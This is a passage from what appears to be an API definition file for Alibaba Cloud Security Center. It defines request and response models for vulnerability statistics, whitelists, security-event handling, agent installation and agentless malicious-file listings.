  return @handler.do('RPC', 'GetVirusScanLatestTaskStatistic', 'POST', '/', 'json', false, 'json', request);
}

model GetVulStatisticsRequest {
  groupIdList: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,).

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9997897', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX', position='Query'),
  typeList: string(name='TypeList', description='The type of the vulnerability whose statistics you want to query. Separate multiple types with commas (,). Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: vulnerability detected by using a web scanner
*   **sca**: vulnerability detected based on software component analysis', example='cve', position='Query'),
}

model GetVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3FE272FA-7263-4554-A90F-A7857945A6D5'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities that have the high priority.', example='16'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities that have the medium priority.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of vulnerabilities that have the low priority.', example='0'),
}

model GetVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulStatisticsResponseBody(name='body'),
}

async function getVulStatistics(request: GetVulStatisticsRequest): GetVulStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetVulStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetVulWhitelistRequest {
  vulWhitelistId?: long(name='VulWhitelistId', description='The ID of the whitelist.', example='1275', position='Query'),
}

model GetVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  vulWhitelist?: {
    aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
    id?: long(name='Id', description='The ID of the whitelist.', example='1275'),
    name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
    reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='Ignore'),
    target?: string(name='Target', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the ID of the server group

*   **uuids**: the UUID of the server

> If this parameter is empty, the rule is applied to all types of assets.', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
    type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
    whitelist?: string(name='Whitelist', description='The information about the vulnerability that is added to the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerabilities

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
  }(name='VulWhitelist', description='The information about the whitelist.'),
}

model GetVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulWhitelistResponseBody(name='body'),
}

async function getVulWhitelist(request: GetVulWhitelistRequest): GetVulWhitelistResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetVulWhitelist', 'POST', '/', 'json', false, 'json', request);
}

model HandleSecurityEventsRequest {
  markBatch?: string(name='MarkBatch', description='Specifies whether to add multiple alert events to the whitelist at a time. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  markMissParam?: string(name='MarkMissParam', description='The whitelist rule. The value of this parameter is in the JSON format and contains the following fields:

*   **field**: The field based on which alert events are added to the whitelist.

*   **operate**: The method that is used to added alert events to the whitelist. Valid values:

    *   **notContains**: does not contain
    *   **contains**: contains
    *   **regex**: matches by regular expression
    *   **strEqual**: equals
    *   **strNotEqual**: does not equal

*   **fieldValue**: The value of the field based on which alert events are added to the whitelist.

*   **uuid**: The application scope of the whitelist rule. Valid values:

    *   **part**: the current asset
    *   **ALL**: all assets

>  You can call the [DescribeSecurityEventOperations](~~DescribeSecurityEventOperations~~) operation to obtain the fields that you can specify for **field**.', example='[{"uuid":"part","field":"gmtModified","operate":"contains","fieldValue":"asd"},{"uuid":"part","field":"loginUser","operate":"contains","fieldValue":"vff"}]', position='Query'),
  operationCode: string(name='OperationCode', description='The operation that you want to perform to handle the alert events. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance\\_mark\\_mis_info**: adds the alert events to the whitelist.
*   **ignore**: ignores the alert events.
*   **manual_handled**: marks the alert events as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill\\_and_quara**: kills the malicious processes and quarantines the source file.
*   **disable\\_malicious_defense**: stops the container on which the alerting files or processes exist.
*   **client\\_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.', example='block_ip', position='Query'),
  operationParams?: string(name='OperationParams', description='The configuration of the operation that you want to perform to handle the alert events.

>  If you set OperationCode to `kill_and_quara` or `block_ip`, you must specify OperationParams. If you set OperationCode to other values, you can leave OperationParams empty.', example='{}', position='Query'),
  remark?: string(name='Remark', description='The remarks of the handling operation.', example='remark test.', position='Query'),
  securityEventIds: [ string ](name='SecurityEventIds', description='The IDs of the alert events.', example='["909361"]', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
}

model HandleSecurityEventsResponseBody = {
  handleSecurityEventsResponse?: {
    taskId?: long(name='TaskId', description='The ID of the task to handle the alert events.', example='15411'),
  }(name='HandleSecurityEventsResponse', description='The handling result of the alert events.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FF0020B9-999F-5DE2-985F-DB282BDA5311'),
}

model HandleSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSecurityEventsResponseBody(name='body'),
}

async function handleSecurityEvents(request: HandleSecurityEventsRequest): HandleSecurityEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'HandleSecurityEvents', 'POST', '/', 'json', false, 'json', request);
}

model HandleSimilarSecurityEventsRequest {
  markMissParam?: string(name='MarkMissParam', description='The whitelist rule. For example, if you want to add a file that contains the string a to the whitelist based on the MD5 hash value, set this parameter to {"field":"md5","operate":"contains","fieldValue":"aa"}.', example='{"field":"md5","operate":"contains","fieldValue":"aa"}', position='Query'),
  operationCode: string(name='OperationCode', description='The operation that you want to perform to handle the alert events.

>  You can call the [DescribeSecurityEventOperations](~~DescribeSecurityEventOperations~~) operation to query the operations.', example='offline_handled', position='Query'),
  operationParams?: string(name='OperationParams', description='The configuration of the operation that you want to perform to handle the alert events. The value of this parameter is in the JSON format.

>  If you set **OperationCode** to **kill\\_and\\_quara**, **block\\_ip**, or **virus\\_quara**, you must specify OperationParams. If you set **OperationCode** to other values, you can leave OperationParams empty. If you set **OperationCode** to **block_ip**, the value of OperationParams must consist of the following fields:

> *   **expireTime**: the end time of locking. Unit: milliseconds.

>  If you set **OperationCode** to **kill\\_and_quara**, the value of OperationParams must consist of the following fields:

> *   **subOperation**: the method of detection and removal. Valid values:

>     *   **killAndQuaraFileByMd5andPath**: terminates the process and quarantines the source file of the process.
>     *   **killByMd5andPath**: terminates the running process.

>  If you set **OperationCode** to **virus_quara**, the value of OperationParams consists of the following fields:

> *   **subOperation**: the method of detection and removal. Valid values:

>     *   **quaraFileByMd5andPath**: quarantines the source file of the process.', example='{"expireTime":1646208726195}', position='Query'),
  remark?: string(name='Remark', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  taskId: long(name='TaskId', description='The ID of the task that handles the alert events at a time.

>  You can call the [CreateSimilarSecurityEventsQueryTask](~~CreateSimilarSecurityEventsQueryTask~~) operation to query the IDs of tasks.', example='666038', position='Query'),
}

model HandleSimilarSecurityEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3653911-33A6-5268-8B91-7690471F7AA1'),
}

model HandleSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSimilarSecurityEventsResponseBody(name='body'),
}

async function handleSimilarSecurityEvents(request: HandleSimilarSecurityEventsRequest): HandleSimilarSecurityEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'HandleSimilarSecurityEvents', 'POST', '/', 'json', false, 'json', request);
}

model IgnoreCheckItemsRequest {
  checkAndRiskTypeList: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='52'),
      riskType?: string(name='RiskType', description='The baseline type of the check item.', example='weak_password'),
    }
  ](name='CheckAndRiskTypeList', description='The risk items.', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  reason?: string(name='Reason', description='The reason why you add the risk item to the whitelist.', example='already config in another way', position='Query'),
  source?: string(name='Source', description='Data Sources. Valid values:

*   **default**: Host baseline
*   **agentless**: Agentless baseline', example='agentless', position='Query'),
  type: int32(name='Type', description='The operation that you want to perform on the risk item.Valid values:
*  **1**: adds the risk item to the whitelist
*  **2**: removes the risk item from the whitelist', example='1', position='Query'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', position='Query'),
}

model IgnoreCheckItemsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='11EBEC99-B4B5-542E-8C17-B87B624C****'),
}

model IgnoreCheckItemsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreCheckItemsResponseBody(name='body'),
}

async function ignoreCheckItems(request: IgnoreCheckItemsRequest): IgnoreCheckItemsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'IgnoreCheckItems', 'POST', '/', 'json', false, 'json', request);
}

model IgnoreHcCheckWarningsRequest {
  checkIds?: string(name='CheckIds', description='The ID of the check item.

>  You can call the [DescribeCheckWarnings](~~116182~~) operation to query the IDs of check items.', example='21313', position='Query'),
  checkWarningIds?: string(name='CheckWarningIds', description='The ID of the alert that is triggered by the check item. Separate multiple IDs with commas (,).

>  You can call the [DescribeCheckWarnings](~~116182~~) operation to query the IDs of alerts that are triggered by check items.', example='98146905,98146907', position='Query'),
  reason?: string(name='Reason', description='The reason for the current operation.', example='ignore', position='Query'),
  riskId?: string(name='RiskId', description='The ID of the risk item that you want to ignore or cancel ignoring.

>  You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of risk items.', example='51', position='Query'),
  source?: string(name='Source', description='The data source. If this parameter is left empty, the server baseline results are queried by default. Valid values:
* **default**: server
* **agentless**', example='agentless', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  type: long(name='Type', description='The type of the operation that you want to perform. Valid values:

*   **1**: ignores a risk item
*   **2**: cancels ignoring a risk item', example='1', position='Query'),
}

model IgnoreHcCheckWarningsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B113119F'),
}

model IgnoreHcCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreHcCheckWarningsResponseBody(name='body'),
}

async function ignoreHcCheckWarnings(request: IgnoreHcCheckWarningsRequest): IgnoreHcCheckWarningsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'IgnoreHcCheckWarnings', 'POST', '/', 'json', false, 'json', request);
}

model InstallBackupClientRequest {
  policyVersion: string(name='PolicyVersion', example='2.0.0', position='Query'),
  uuid?: string(name='Uuid', example='inet-617eddab-7df4-4a51-b217-a3f59194****', position='Query'),
  uuidList?: [ string ](name='UuidList', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]', position='Query'),
}

model InstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model InstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallBackupClientResponseBody(name='body'),
}

async function installBackupClient(request: InstallBackupClientRequest): InstallBackupClientResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'InstallBackupClient', 'POST', '/', 'json', false, 'json', request);
}

model InstallCloudMonitorRequest {
  agentAccessKey?: string(name='AgentAccessKey', description='The AccessKey ID that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](~~114948~~) operation to query the AccessKey ID.

> This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='usY*****R_U', position='Query'),
  agentSecretKey?: string(name='AgentSecretKey', description='The AccessKey secret that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](~~114948~~) operation to query the AccessKey secret.

> This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='UCxF2R1sIO90XlU9****', position='Query'),
  argusVersion: string(name='ArgusVersion', description='The version of the CloudMonitor agent that you want to install on the servers. For more information about the latest version of the CloudMonitor agent, see [Overview](~~183431~~).', example='3.5.6', position='Query'),
  instanceIdList?: [ string ](name='InstanceIdList', description='The IDs of the servers on which you want to install the CloudMonitor agent. Separate multiple IDs with commas (,).', position='Query'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers on which you want to install the CloudMonitor agent. Separate multiple UUIDs with commas (,).', position='Query'),
}

model InstallCloudMonitorResponseBody = {
  code?: string(name='Code', description='The error code returned if the request fails.', example='IllegalParam'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='400'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F92AFB96-FACC-57E7-928E-678D04B94CAE'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='false'),
}

model InstallCloudMonitorResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallCloudMonitorResponseBody(name='body'),
}

/**
  * > Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
  *
 */
async function installCloudMonitor(request: InstallCloudMonitorRequest): InstallCloudMonitorResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'InstallCloudMonitor', 'POST', '/', 'json', false, 'json', request);
}

model InstallHybridProxyRequest {
  clusterName?: string(name='ClusterName', example='proxy-test', position='Query'),
  installCode?: string(name='InstallCode', example='Z9c8SA', position='Query'),
  yundunUuids?: [ string ](name='YundunUuids', position='Query'),
}

model InstallHybridProxyResponseBody = {
  requestId?: string(name='RequestId', example='E55BE5DB-E2DF-57EB-A0C5-7A85EEA67A4C'),
}

model InstallHybridProxyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallHybridProxyResponseBody(name='body'),
}

async function installHybridProxy(request: InstallHybridProxyRequest): InstallHybridProxyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'InstallHybridProxy', 'POST', '/', 'json', false, 'json', request);
}

model InstallPmAgentRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='58.35.xx.xx', position='Query'),
  type: string(name='Type', description='The type of the client.

*   **aliyun_assist**: Cloud Assistant client
*   **aliyun_monitor**: CloudMonitor client', example='aliyun_monitor', position='Query'),
  uuids: string(name='Uuids', description='The UUID of the server. If you specify multiple UUIDs, separate the UUIDs with commas (,).', example='inet-a6444920-d303-4ccf-ab87-a1d3cd49****', position='Query'),
}

model InstallPmAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D49B5134-9511-5736-B447-BEE0AC66****'),
}

model InstallPmAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallPmAgentResponseBody(name='body'),
}

async function installPmAgent(request: InstallPmAgentRequest): InstallPmAgentResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'InstallPmAgent', 'POST', '/', 'json', false, 'json', request);
}

model InstallRaspAttachRequest {
  applicationId: string(name='ApplicationId', description='The application group ID.', example='64b8b994563c306b4fedxxxx', position='Query'),
  ecsUUIDList?: [ string ](name='EcsUUIDList', description='The UUIDs of ECS instances on which the RASP agent is to be installed.', position='Query'),
}

model InstallRaspAttachResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='86CFF42E-E00A-57A3-8656-22291EFB****'),
}

model InstallRaspAttachResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallRaspAttachResponseBody(name='body'),
}

async function installRaspAttach(request: InstallRaspAttachRequest): InstallRaspAttachResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'InstallRaspAttach', 'POST', '/', 'json', false, 'json', request);
}

model InstallUniBackupAgentRequest {
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
}

model InstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='53ACA55D-0325-5056-A72D-D0EC0B9C****'),
}

model InstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallUniBackupAgentResponseBody(name='body'),
}

async function installUniBackupAgent(request: InstallUniBackupAgentRequest): InstallUniBackupAgentResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'InstallUniBackupAgent', 'POST', '/', 'json', false, 'json', request);
}

model JoinWebLockProcessWhiteListRequest {
  processPaths?: [ string ](name='ProcessPaths', description='The paths of the processes.', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which the processes run. Separate multiple UUIDs with commas (,).', example='0c1714dc-f7a3-4265-8364-7aa3fce8****,1cc45e7d-7698-4b2c-89d8-e8cba407****', position='Query'),
}

model JoinWebLockProcessWhiteListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A47D621A-193E-5BDA-ADFA-A0D3133E199C'),
}

model JoinWebLockProcessWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: JoinWebLockProcessWhiteListResponseBody(name='body'),
}

async function joinWebLockProcessWhiteList(request: JoinWebLockProcessWhiteListRequest): JoinWebLockProcessWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'JoinWebLockProcessWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model ListAgentlessMaliciousFilesRequest {
  currentPage: int32(name='CurrentPage', description='The page number.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   Y: The vulnerability is handled.
*   N: The vulnerability is not handled.', example='Y', position='Query'),
  eventId?: long(name='EventId', description='The event ID.', example='81****', position='Query'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName', description='The name of the malicious file that you want to query.

> Fuzzy match is supported.', example='WebShell', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  levels?: string(name='Levels', description='The severities of the malicious files. Separate multiple values with commas (,). Valid values:

*   serious
*   suspicious
*   remind', example='remind,suspicious', position='Query'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious file.', example='d836968041f7683b5459****', position='Query'),
  maliciousType?: string(name='MaliciousType', description='The alert type.

Valid values when Lang is set to zh:

*   WebShell
*   Malicious Software
*   Malicious Script

Valid values when Lang is set to en:

*   WebShell
*   Malicious Software
*   Malicious Script', example='WebShell', position='Query'),
  pageSize: string(name='PageSize', description='The number of entries per page.', example='20', position='Query'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset. Fuzzy match is supported.', example='192.168.XX.XX', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the asset.', example='d2d94e8b-bb25-4744-8004-1e08a53c****', position='Query'),
}

model ListAgentlessMaliciousFilesResponseBody = {
  list?: [ 
    {
      details?: [ 
        {
          name?: string(name='Name', description='The name of the detailed item.', example='MD5'),
          nameKey?: string(name='NameKey', description='The name key of the detailed item.', example='${suspicious.mp.db.maliciousfilemd5}'),
          type?: string(name='Type', description='The type of the detailed item.', example='text'),
          value?: string(name='Value', description='The value of the detailed item.', example='1'),
        }
      ](name='Details', description='The details of the alert event.'),
      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://upgrade-rule-pkg.oss-cn-beijing.aliyuncs.com/totalpackage/rule/V3.166.2/totalpackage_rule_V3.16_6.2_tip_20230220110****'),
      filePath?: long(name='FilePath', description='The file path.', example='/root/etc/g****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='168257753****'),
      highLight?: string(name='HighLight', description='The highlighted JSON string.', example='{\\"highlight\\":{\\"ruleVersion\\":\\"20230223\\",\\"ruleId\\":600139,\\"events\\":[[207,284]]}}'),
      id?: long(name='Id', description='The event ID.', example='1****'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-001****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='168257753****'),
      level?: string(name='Level', description='The severity of the malicious file. Valid values:

*   serious
*   suspicious
*   remind', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious file.', example='1f2e13a7c51ee89316ae50066515****'),
      maliciousName?: string(name='MaliciousName', description='The name of the malicious file.', example='WebShell'),
      maliciousType?: string(name='MaliciousType', description='The type of the virus.', example='WebShell'),
      notes?: [ 
        {
          note?: string(name='Note', description='The remark.', example='Serious***'),
          noteId?: string(name='NoteId', description='The ID of the remark.', example='50****'),
          noteTime?: string(name='NoteTime', description='The time when the remark was created.', example='2023-04-27 14:49:21'),
        }
      ](name='Notes', description='The remarks.'),
      operateResult?: string(name='OperateResult', description='The handling result of the alert.', example='addWhitelist.USER.Success'),
      operateTimestamp?: string(name='OperateTimestamp', description='The timestamp generated when the alert is handled. Unit: milliseconds.', example='168257753****'),
      partition?: string(name='Partition', description='The partition of the disk.', example='/dev/xvda1'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.', example='m-****'),
      targetName?: string(name='TargetName', description='The name of the asset that is scanned.', example='jenkins****'),
      targetType?: string(name='TargetType', description='The type of the asset that is scanned. Valid values:

*   2: The scanned asset is an image.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The malicious files.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE343162-35BF-565E-B85E-8E3B7A2B****'),
}

model ListAgentlessMaliciousFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAgentlessMaliciousFilesResponseBody(name='body'),
}

async function listAgentlessMaliciousFiles(request: ListAgentlessMaliciousFilesRequest): ListAgentlessMaliciousFilesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAgentlessMaliciousFiles', 'POST', '/', 'json', false, 'json', request);
}

model ListAgentlessRegionRequest {
}

model ListAgentlessRegionResponseBody = {
  regionList?: [ string ](name='RegionList', description='The information about the regions.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
}

model ListAgentlessRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAgentlessRegionResponseBody(name='body'),
}

async function listAgentlessRegion(request: ListAgentlessRegionRequest): ListAgentlessRegionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAgentlessRegion', 'POST', '/', 'json', false, 'json', request);
}

model ListAgentlessRelateMaliciousRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  eventId?: long(name='EventId', description='The ID of the event.', example='80****', position='Query'),
  pageSize: string(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
}

model ListAgentlessRelateMaliciousResponseBody = {
  list?: [ 
    {
      filePath?: string(name='FilePath', description='The file path.', example='/root/logs/arms/tracelogs/log****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='168257753****'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='168257753****'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The list of hosts that are associated with the risk.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='197'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FCA270CC-24C8-5DA1-9184-20F2605C****'),
}

model ListAgentlessRelateMaliciousResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAgentlessRelateMaliciousResponseBody(name='body'),
}

async function listAgentlessRelateMalicious(request: ListAgentlessRelateMaliciousRequest): ListAgentlessRelateMaliciousResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAgentlessRelateMalicious', 'POST', '/', 'json', false, 'json', request);
}

model ListAgentlessRiskUuidRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  internetIp?: string(name='InternetIp', description='The public IP address of the asset that you want to query.', example='1.1.XX.XX', position='Query'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the asset that you want to query.', example='172.26.XX.XX', position='Query'),
  machineName?: string(name='MachineName', description='The name of the instance.', example='oracle-win-001****', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
  risk?: boolean(name='Risk', description='Specifies whether risks exist. Valid values:

*   **true**: Risks exist.
*   **false**: Risks do not exist.', example='true', position='Query'),
  targetName?: string(name='TargetName', description='The name of the detection object.', example='source-test-obj-0****', position='Query'),
}

model ListAgentlessRiskUuidResponseBody = {
  list?: [ 
    {
      baselineCount?: int32(name='BaselineCount', description='The number of baseline risks.', example='1'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      maliciousCount?: int32(name='MaliciousCount', description='The number of malicious samples.', example='1'),
      scanTime?: long(name='ScanTime', description='The timestamp of the detection. Unit: milliseconds.', example='168257753****'),
      targetId?: string(name='TargetId', description='The ID of the asset that is detected.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset that is detected.', example='test****'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vulCount?: int32(name='VulCount', description='The number of detected vulnerabilities.', example='1'),
    }
  ](name='List', description='The information about the hosts.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='05AE6B16-741A-5A75-9BF0-BC747DD9****'),
}

model ListAgentlessRiskUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAgentlessRiskUuidResponseBody(name='body'),
}

